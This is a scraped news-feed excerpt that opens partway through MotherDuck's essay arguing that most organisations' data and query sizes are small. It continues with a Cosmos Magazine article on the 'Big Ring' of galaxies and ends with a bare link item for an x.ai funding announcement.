                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_3_311addb207.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p>MongoDB is the highest ranked NoSQL or otherwise scale-out database, and while it had a nice run-up over the years, it has been declining slightly recently, and hasn’t really made much headway against MySQL or Postgres, two resolutely monolithic databases. If Big Data were really taking over, you’d expect to see something different after all these years.</p><p>Of course, the picture looks different in analytical systems, but in OLAP you see a massive shift from on-premise to cloud, and there aren’t really any scale-up cloud analytical systems to compare against.</p></section>
<section><h2 id="most-people-dont-have-that-much-data">Most people don’t have that much data</h2><p>The intended takeaway from the “Big Data is coming” chart was that pretty soon, everyone will be inundated by their data. Ten years in, that future just hasn’t materialized. We can validate this several ways: looking at data (quantitatively), asking people if it is consistent with their experience (qualitatively), and thinking it through from first principles (inductively).</p><p>When I worked at BigQuery, I spent a lot of time looking at customer sizing. The actual data here is very sensitive, so I can’t share any numbers directly. However, I can say that the vast majority of customers had less than a terabyte of data in total data storage. There were, of course, customers with huge amounts of data, but most organizations, even some fairly large enterprises, had moderate data sizes.</p><p>Customer data sizes followed a power-law distribution. The largest customer had double the storage of the next largest customer, the next largest customer had half of that, etc. So while there were customers with hundreds of petabytes of data, the sizes trailed off very quickly.  There were many thousands of customers who paid less than $10 a month for storage, which is half a terabyte. Among customers who were using the service heavily, the median data storage size was much less than 100 GB.</p><img alt="Customer size of data as power law distribution" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_4_d512a09905.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p>We found further support for this when talking to industry analysts (Gartner, Forrester, etc). We would extol our ability to handle massive data sets, and they would shrug. “This is nice,” they said, “but the vast majority of enterprises have data warehouses smaller than a terabyte.” The general feedback we got talking to folks in the industry was that 100 GB was the right order of magnitude for a data warehouse. This is where we focused a lot of our efforts in benchmarking.</p><p>One of our investors decided to find out how big analytical data sizes really are and surveyed his portfolio companies, some which were post-exit (either had IPO’d or been acquired by larger organizations). These are tech companies, which are likely going to skew towards larger data sizes. He found that the largest B2B companies in his portfolio had around a terabyte of data, while the largest B2C companies had around 10 Terabytes of data. Most, however, had far less data.</p><p>In order to understand why large data sizes are rare, it is helpful to think about where the data actually comes from. Imagine you’re a medium sized business, with a thousand customers. Let’s say each one of your customers places a new order every day with a hundred line items. This is relatively frequent, but it is still probably less than a megabyte of data generated per day. In three years you would still only have a gigabyte, and it would take millenia to generate a terabyte.</p><p>Alternately, let’s say you have a million leads in your marketing database, and you’re running dozens of campaigns. Your leads table is probably still less than a gigabyte, and tracking each lead across each campaign still probably is only a few gigabytes. It is hard to see how this adds to massive data sets under reasonable scaling assumptions.</p><p>To give a concrete example, I worked at SingleStore in 2020-2022, when it was a fast-growing Series E company with significant revenue and a unicorn valuation. If you added up the size of our finance data warehouse, our customer data, our marketing campaign tracking, and our service logs, it was probably only a few gigabytes. By any stretch of the imagination, this is not big data.</p></section>
<section><h2 id="the-storage-bias-in-separation-of-storage-and-compute">The storage bias in separation of storage and compute.</h2><p>Modern cloud data platforms all separate storage and compute, which means that customers are not tied to a single form factor. This, more than scale out, is likely the single most important change in data architectures in the last 20 years. Instead of “shared nothing” architectures which are hard to manage in real world conditions, shared disk architectures let you grow your storage and your compute independently. The rise of scalable and reasonably fast object storage like S3 and GCS meant that you could relax a lot of the constraints on how you built a database.</p><p>In practice, data sizes increase much faster than compute sizes. While popular descriptions of the benefits of storage and compute separation make it sound like you may choose to scale either one at any time, the two axes are not really equivalent. Misunderstanding of this point leads to a lot of the discussion of Big Data, because techniques for dealing with large compute requirements are different from dealing with large data. It is helpful to explore why this may be the case.</p><img alt="compute power increasing faster than data sizes" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_5_81566ed0de.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p>All large data sets are generated over time. Time is almost always an axis in a data set. New orders come in every day. New taxi rides. New logging records. New games being played. If a business is static, neither growing or shrinking, data will increase linearly with time. What does this mean for analytic needs? Clearly data storage needs will increase linearly, unless you decide to prune the data (more on this later). But compute needs will likely not need to change very much over time; most analysis is done over the recent data. Scanning old data is pretty wasteful; it doesn’t change, so why would you spend money reading it over and over again? True, you might want to keep it around just in case you want to ask a new question of the data, but it is pretty trivial to build aggregations containing the important answers.</p><p>Very often when a data warehousing customer moves from an environment where they didn’t have separation of storage and compute into one where they do have it, their storage usage grows tremendously, but their compute needs tend to not really change. In BigQuery, we had a customer who was one of the largest retailers in the world. They had an on-premise data warehouse that was around 100 TB of data. When they moved to the cloud, they ended up with 30 PB of data, a 300x increase. If their compute needs had also scaled up by a similar amount, they would have been spending billions of dollars on analytics. Instead, they spent a tiny fraction of that amount.</p><p>This bias towards storage size over compute size has a real impact in system architecture. It means that if you use scalable object stores, you might be able to use far less compute than you had anticipated. You might not even need to use distributed processing at all.</p></section>
<section><h2 id="workload-sizes-are-smaller-than-overall-data-sizes">Workload sizes are smaller than overall data sizes</h2><p>The amount of data processed for analytics workloads is almost certainly smaller than you think. Dashboards, for example, very often are built from aggregated data. People look at the last hour, or the last day, or the last week’s worth of data. Smaller tables tend to be queried more frequently, giant tables more selectively.</p><p>A couple of years ago I did an analysis of BigQuery queries, looking at customers spending more than $1000 / year. 90% of queries processed less than 100 MB of data. I sliced this a number of different ways to make sure it wasn’t just a couple of customers who ran a ton of queries skewing the results. I also cut out metadata-only queries, which are a small subset of queries in BigQuery that don’t need to read any data at all. You have to go pretty high on the percentile range until you get into the gigabytes, and there are very few queries that run in the terabyte range.</p><blockquote>
<p>Customers with giant data sizes almost never queried huge amounts of data</p>
</blockquote><p>Customers with moderate data sizes often did fairly large queries, but customers with giant data sizes almost never queried huge amounts of data. When they did, it was generally because they were generating a report, and performance wasn’t really a priority. A large social media company would run reports over the weekend to prepare for executives on Monday morning; those queries were pretty huge, but they were only a tiny fraction of the hundreds of thousands of queries they ran the rest of the week.</p><img alt="most query workloads are less than 10GB" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_6_b1fb1ad998.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p>Even when querying giant tables, you rarely end up needing to process very much data. Modern analytical databases can do column projection to read only a subset of fields, and partition pruning to read only a narrow date range. They can often go even further with segment elimination to exploit locality in the data via clustering or automatic micro partitioning. Other tricks like computing over compressed data, projection, and predicate pushdown are ways that you can do less IO at query time. And less IO turns into less computation that needs to be done, which turns into lower costs and latency.</p><p>There are acute economic pressures incentivizing people to reduce the amount of data they process. Just because you can scale out and process something very fast doesn’t mean you can do so inexpensively. If you use a thousand nodes to get a result, that is probably going to cost you an arm and a leg. The Petabyte query I used to run on stage to show off BigQuery cost $5,000 at retail prices. Very few people would want to run something so expensive.</p><p>Note that the financial incentive to processing less data holds true even if you’re not using a pay-per-byte-scanned pricing model. If you have a Snowflake instance, if you can make your queries smaller, you can use a smaller instance, and pay less. Your queries will be faster, you can run more concurrently, and you generally will pay less over time.</p></section>
<section><h2 id="most-data-is-rarely-queried">Most data is rarely queried</h2><p>A huge percentage of the data that gets processed is less than 24 hours old. By the time data gets to be a week old, it is probably 20 times less likely to be queried than from the most recent day. After a month, data mostly just sits there. Historical data tends to be queries infrequently, perhaps when someone is running a rare report.</p><img alt="as data gets older, it's processed much less" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_7_c4ff57600f.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p>Data storage age patterns are a lot flatter. While a lot of data gets discarded pretty quickly, a lot of data just gets appended to the end of tables. The most recent year might only have 30% of the data but 99% of data accesses. The most recent month might have 5% of data but 80% of data accesses.</p><p>The quiescing of data means that data working set sizes are more manageable than you would expect. If you have a petabyte table that has 10 years worth of data, you might rarely access any of the data older than the current day, which might have less than 50 GB compressed.</p></section>
<section><h2 id="the-big-data-frontier-keeps-receding">The Big Data Frontier keeps receding</h2><p>One definition of “Big Data” is “whatever doesn’t fit on a single machine.. By that definition, the number of workloads that qualify has been decreasing every year.</p><p>In 2004, when the Google MapReduce paper was written, it would have been very common for a data workload to not fit on a single commodity machine. Scaling up was expensive. In 2006, AWS launched EC2, and the only size of instance you could get was a single core and 2 GB of RAM. There were a lot of workloads that wouldn’t fit on that machine.</p><p>Today, however, a standard instance on AWS uses a physical server with 64 cores and 256 GB of RAM.  That’s two orders of magnitude more RAM. If you’re willing to spend a little bit more for a memory-optimized instance, you can get another two orders of magnitude of RAM. How many workloads need more than 24TB of RAM or 445 CPU cores?</p><img alt="single machines are capable of processing a much greater percentage of workloads as time goes on and technology advances" sizes="90vw,
                        (min-width: 728px) 688px,
                        (min-width: 960px) 840px,
                        (min-width: 1302px) 816px," srcset="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=640&amp;q=75 640w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=750&amp;q=75 750w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=828&amp;q=75 828w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=1080&amp;q=75 1080w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=1200&amp;q=75 1200w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=1920&amp;q=75 1920w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=2048&amp;q=75 2048w, https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=3840&amp;q=75 3840w" src="https://motherduck.com/_next/image/?url=https%3A%2F%2Fweb-assets-prod.motherduck.com%2Fassets%2Fimg%2Fimage_8_35f21f407c.jpg&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"><p>It used to be that larger machines were a lot more expensive. However, in the cloud, a VM that uses a whole server only costs 8x more than one that uses an 8th of a server. Cost scales up linearly with compute power, up through some very large sizes. In fact, if you look at the benchmarks published in the original dremel paper using 3,000 parallel nodes, you can get similar performance on a single node today (more on this to come).</p></section>
<section><h2 id="data-is-a-liability">Data is a Liability</h2><p>An alternate definition of Big Data is “when the cost of keeping data around is less than the cost of figuring out what to throw away.” I like this definition because it encapsulates why people end up with Big Data. It isn’t because they need it; they just haven’t bothered to delete it. If you think about many data lakes that organizations collect, they fit this bill entirely: giant, messy swamps where no one really knows what they hold or whether it is safe to clean them up.</p><p>The cost of keeping data around is higher than just the cost to store the physical bytes. Under regulations like GDPR and CCPA, you are required to track all usage of certain types of data. Some data needs to be deleted within a certain period of time. If you have phone numbers in a parquet file that sit around for too long in your data lake somewhere, you may be violating statutory requirements.</p><p>Beyond regulation, data can be an aid to lawsuits against you. Just as many organizations enforce limited email retention policies in order to reduce potential liability, the data in your data warehouse can likewise be used against you. If you’ve got logs from five years ago that would show a security bug in your code or missed SLA, keeping old data around can prolong your legal exposure. There is a possibly apocryphal story I’ve heard about a company keeping its data analytics capabilities secret in order to prevent them from being used during a legal discovery process.</p><p>Code often suffers from what people call “bit rot” when it isn’t actively maintained. Data can suffer from the same type of problem; that is, people forget the precise meaning of specialized fields, or data problems from the past may have faded from memory. For example, maybe there was a short-lived data bug that set every customer id to null. Or there was a huge fraudulent transaction that made it look like Q3 2017 was a lot better than it actually was. Often business logic to pull out data from a historical time period can get more and more complicated. For example, there might be a rule like, “ if the date is older than 2019 use the revenue field, between 2019 and 2021 use the revenue_usd field, and after 2022 use the revenue_usd_audited field.” The longer you keep data around, the harder it is to keep track of these special cases. And not all of them can be easily worked around, especially if there is missing data.</p><p>If you are keeping around old data, it is good to understand why you are keeping it. Are you asking the same questions over and over again? If that is the case, wouldn’t it be far less expensive in terms of storage and query costs to just store aggregates? Are you keeping it for a rainy day? Are you thinking that there are new questions you might want to ask? If so, how important is it? How likely is it that you’ll really need it? Are you really just a data hoarder? These are all important questions to ask, especially as you try to figure out the true cost of keeping the data.</p></section>
<section><h2 id="are-you-in-the-big-data-one-percent">Are you in the BIg Data One Percent?</h2><p>Big Data is real, but most people may not need to worry about it. Some questions that you can ask to figure out if you’re a “Big Data One-Percenter”:</p><ul>
<li>Are you really generating a huge amount of data?</li>
<li>If so, do you really need to use a huge amount of data at once?</li>
<li>If so, is the data really too big to fit on one machine?</li>
<li>If so, are you sure you’re not just a data hoarder?</li>
<li>If so, are you sure you wouldn’t be better off summarizing?</li>
</ul><p>If you answer no to any of these questions, you might be a good candidate for a new generation of data tools that help you handle data at the size you actually have, not the size that people try to scare you into thinking that you might have someday.</p></section></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A Big Ring on the Sky (210 pts)]]></title>
            <link>https://cosmosmagazine.com/space/astronomy/giant-structure-space-universe/</link>
            <guid>40488206</guid>
            <pubDate>Mon, 27 May 2024 06:32:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cosmosmagazine.com/space/astronomy/giant-structure-space-universe/">https://cosmosmagazine.com/space/astronomy/giant-structure-space-universe/</a>, See on <a href="https://news.ycombinator.com/item?id=40488206">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

            <main>
                                    <nav aria-label="breadcrumbs"><p><a href="https://cosmosmagazine.com/">Cosmos</a><span> » </span><a href="https://cosmosmagazine.com/space/astronomy/">Astronomy</a></p></nav>
<section>
    <article>

    <header>
        
        <div data-featured-image="big-ring-body1.jpg">
                                                
                                            <p><img width="1200" height="674" src="https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2024/03/big-ring-body1.jpg" data-spai-egr="1" alt="blue ring red arc of galaxies in the sky with constellations" decoding="async" srcset="https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2024/03/big-ring-body1.jpg 1200w, https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2024/03/big-ring-body1-600x337.jpg 600w, https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2024/03/big-ring-body1-768x431.jpg 768w, https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2024/03/big-ring-body1-300x169.jpg 300w" sizes="(max-width: 1200px) 100vw, 1200px" data-old-src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjAwIDY3NCIgd2lkdGg9IjEyMDAiIGhlaWdodD0iNjc0IiBkYXRhLXU9IiUyRndwLWNvbnRlbnQlMkZ1cGxvYWRzJTJGMjAyNCUyRjAzJTJGYmlnLXJpbmctYm9keTEuanBnIiBkYXRhLXc9IjEyMDAiIGRhdGEtaD0iNjc0IiBkYXRhLWJpcD0iIj48L3N2Zz4="></p><p>Artist impression of the Big Ring (blue) and Giant Arc (red). Credit: University of Central Lancashire/Stellarium.</p>
                                                        </div>
    </header>

    <div>
                    
<p>About 9.2 billion light-years from Earth is a colossal structure which has confounded astronomers.</p>



<p>The discovery might upend current cosmological theories.</p>



<p>What they’ve found is a 1.3-billion-light-year-across, almost perfect ring of galaxies. No such structure has been seen before. And it doesn’t match any known formation mechanism. It has been dubbed the “Big Ring.”</p>



<p>The discovery was presented at the <a href="https://submissions.mirasmart.com/AAS243/Itinerary/EventsAAG.aspx" target="_blank" rel="noopener">243rd meeting</a> of the American Astronomical Society and is detailed in a <a href="https://arxiv.org/abs/2402.07591" target="_blank" rel="noopener">pre-print paper available on arXiv</a>.</p>



<p>It is the second giant structure found by teams led by Alexia Lopez, an astronomer at the University of Central Lancashire in the UK. The first, a giant arc of galaxies, was <a href="https://academic.oup.com/mnras/article/516/2/1557/6657809" target="_blank" rel="noopener">unveiled</a> in 2022. That structure is 3.3 billion light-years across and appears in the same region of sky at the same distance from Earth as the Big Ring.</p>



<p>“Neither of these two ultra-large structures is easy to explain in our current understanding of the universe,” Lopez says. “And their ultra-large sizes, distinctive shapes, and cosmological proximity must surely be telling us something important – but what exactly?”</p>



        

<p>A possible explanation for the Big Ring, according to Lopez, is “Baryonic Acoustic Oscillations” (BAOs).</p>
<p><a href="https://cosmosmagazine.com/shop/subscriptions/my-cosmos/join-us/" data-device="mobile">
    <img decoding="async" src="https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2024/02/MicrosoftTeams-image-6.jpg" data-spai-egr="1" alt="Newsletter" title="giant structure in space challenges understanding of the universe 1" data-old-src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMDAgMjUwIiB3aWR0aD0iMzAwIiBoZWlnaHQ9IjI1MCIgZGF0YS11PSIlMkZ3cC1jb250ZW50JTJGdXBsb2FkcyUyRjIwMjQlMkYwMiUyRk1pY3Jvc29mdFRlYW1zLWltYWdlLTYuanBnIiBkYXRhLXc9IjMwMCIgZGF0YS1oPSIyNTAiIGRhdGEtYmlwPSIiPjwvc3ZnPg==">
</a></p><p>“BAOs arise from oscillations in the early universe and today should appear, statistically at least, as spherical shells in the arrangement of galaxies. However, detailed analysis of the Big Ring revealed it is not really compatible with the BAO explanation: the Big Ring is too large and is not spherical.”</p>



<p>Another possibility is the structures are remnants of “defects” in the early universe called cosmic strings.</p>



<p>The structures challenge the so-called “Cosmological Principle.”</p>



<p>“The Cosmological Principle assumes that the part of the universe we can see is viewed as a ‘fair sample’ of what we expect the rest of the universe to be like,” Lopez explains. “We expect matter to be evenly distributed everywhere in space when we view the universe on a large scale, so there should be no noticeable irregularities above a certain size.”</p>



<p>“Cosmologists calculate the current theoretical size limit of structures to be 1.2 billion light-years, yet both of these structures are much larger,” Lopez adds.</p>



<p>“From current cosmological theories we didn’t think structures on this scale were possible. We could expect maybe one exceedingly large structure in all our observable universe. Yet, the Big Ring and the Giant Arc are two huge structures and are even cosmological neighbours, which is extraordinarily fascinating,” Lopez says.</p>



<div><a href="https://link.cosmosmagazine.com/KA94"><p><img decoding="async" src="https://cdn.shortpixel.ai/spai/q_lossy+ret_img+to_auto/cosmosmagazine.com/wp-content/uploads/2023/12/MICROSCOPIC-TO-TELESCOPIC__Embed-graphic-720x360-1.jpg" data-spai-egr="1" width="600" alt="Buy cosmos print magazine" title="giant structure in space challenges understanding of the universe 2" data-old-src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MjcgMzYwIiB3aWR0aD0iNzI3IiBoZWlnaHQ9IjM2MCIgZGF0YS11PSIlMkZ3cC1jb250ZW50JTJGdXBsb2FkcyUyRjIwMjMlMkYxMiUyRk1JQ1JPU0NPUElDLVRPLVRFTEVTQ09QSUNfX0VtYmVkLWdyYXBoaWMtNzIweDM2MC0xLmpwZyIgZGF0YS13PSI3MjciIGRhdGEtaD0iMzYwIiBkYXRhLWJpcD0iIj48L3N2Zz4="></p></a></div>
<!-- Start of tracking content syndication. Please do not remove this section as it allows us to keep track of republished articles -->
<p><img id="cosmos-post-tracker" width="1" height="1" aria-label="Syndication Tracker" src="https://syndication.cosmosmagazine.com/?id=304009&amp;title=Giant+structure+in+space+challenges+understanding+of+the+universe" loading="lazy"></p><!-- End of tracking content syndication -->

                </div>
</article>

</section>

<!-- CosmosMagazine - Mobile Adhesion (00000000001fc737) -->
<!-- CosmosMagazine - Post Bottom Desktop (000000000023d099) -->


<!-- CosmosMagazine - Post Bottom Mobile (000000000023d09a) -->
    
                </main>

                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[X.ai: $6B Series B (155 pts)]]></title>
            <link>https://x.ai/blog/series-b</link>
            <guid>40487844</guid>
            <pubDate>Mon, 27 May 2024 05:30:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://x.ai/blog/series-b">https://x.ai/blog/series-b</a>, See on <a href="https://news.ycombinator.com/item?id=40487844">Hacker News</a></p>
